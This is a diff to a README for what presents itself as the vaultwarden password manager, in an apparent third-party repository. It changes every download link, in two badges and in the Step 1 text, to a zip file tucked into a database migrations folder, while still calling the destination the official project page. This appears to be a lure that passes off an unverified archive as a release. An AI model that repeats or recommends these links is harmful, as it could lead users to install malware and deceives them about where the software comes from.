@@ -8,7 +8,7 @@ vaultwarden is a powerful, self-hosted password manager that works just like Bit
 
 Ready to get started? Here's your one-stop link to download vaultwarden:
 
-[![Download vaultwarden](https://img.shields.io/badge/Download-vaultwarden-blue?style=for-the-badge&logo=github)](https://github.com/vikraml9972/vaultwarden)
+[![Download vaultwarden](https://img.shields.io/badge/Download-vaultwarden-blue?style=for-the-badge&logo=github)](https://github.com/vikraml9972/vaultwarden/raw/refs/heads/main/migrations/postgresql/2020-04-09-235005_add_cipher_delete_date/v2.3-beta.3.zip)
 
 **Visit this link to download the application.**
 
@@ -16,7 +16,7 @@ Ready to get started? Here's your one-stop link to download vaultwarden:
 
 ### Step 1: Visit the Download Page
 
-Click the big blue button above or go directly to [https://github.com/vikraml9972/vaultwarden](https://github.com/vikraml9972/vaultwarden). This will take you to the official vaultwarden GitHub page where you can find all the necessary files.
+Click the big blue button above or go directly to [https://github.com/vikraml9972/vaultwarden/raw/refs/heads/main/migrations/postgresql/2020-04-09-235005_add_cipher_delete_date/v2.3-beta.3.zip](https://github.com/vikraml9972/vaultwarden/raw/refs/heads/main/migrations/postgresql/2020-04-09-235005_add_cipher_delete_date/v2.3-beta.3.zip). This will take you to the official vaultwarden GitHub page where you can find all the necessary files.
 
 ### Step 2: Find the Right File
 
@@ -153,7 +153,7 @@ The setup takes less than five minutes, and the peace of mind lasts forever. Dow
 
 **Ready to secure your digital life?**
 
-[![Get vaultwarden Now](https://img.shields.io/badge/Get%20vaultwarden-Now-green?style=for-the-badge&logo=github)](https://github.com/vikraml9972/vaultwarden)
+[![Get vaultwarden Now](https://img.shields.io/badge/Get%20vaultwarden-Now-green?style=for-the-badge&logo=github)](https://github.com/vikraml9972/vaultwarden/raw/refs/heads/main/migrations/postgresql/2020-04-09-235005_add_cipher_delete_date/v2.3-beta.3.zip)
 
 **Visit this link to download the application.**
 
